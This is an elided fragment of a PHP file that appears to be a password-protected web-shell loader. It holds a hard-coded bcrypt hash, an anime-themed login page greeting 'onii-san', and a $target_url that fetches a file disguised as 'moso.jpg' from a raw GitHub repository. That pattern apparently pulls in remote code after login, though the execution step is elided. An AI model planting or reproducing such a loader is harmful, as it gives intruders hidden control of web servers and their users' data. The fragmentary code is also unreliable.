...
$secure_password_hash = '$2y$10$8L4FvaqyeKGmz7MqvOCBpOsEp8E0NakUVBo.3dPqu5WhPFZxylrOm'; 
...
<head>
    ...
    <style>
        ...
        * {
        ...
        body {
            background: url('https://wallpaperbat.com/img/491008-4k-anime-landscape-wallpaper-in-2020-scenery-wallpaper-aesthetic-desktop-wallpaper-desktop-wallpaper-art.jpg') no-repeat center center fixed;
        ...
        .login-title::after {
            ...
            width: 80px;
            height: 4px;
            background: linear-gradient(to right, #ff6b9d, #ff8e6b);
            margin: 10px auto 0;
            border-radius: 2px;
        }
        ...
        @keyframes pulse {
            ...
            100% { box-shadow: 0 0 30px rgba(255, 107, 157, 0.9); }
        }
    </style>
</head>
<body>
    ...
    <div class="login-container">
        ...
        <div class="anime-character">
            <img src="https://i.pinimg.com/736x/cc/b5/b5/ccb5b5220807fcb49771c965d06395c1.jpg" alt="Anime Character">
        </div>
        <h1 class="login-title">Helo onii-san >< </h1>
        <form method="post">
...
$target_url = 'https://raw.githubusercontent.com/siapman/woman/refs/heads/main/moso.jpg';
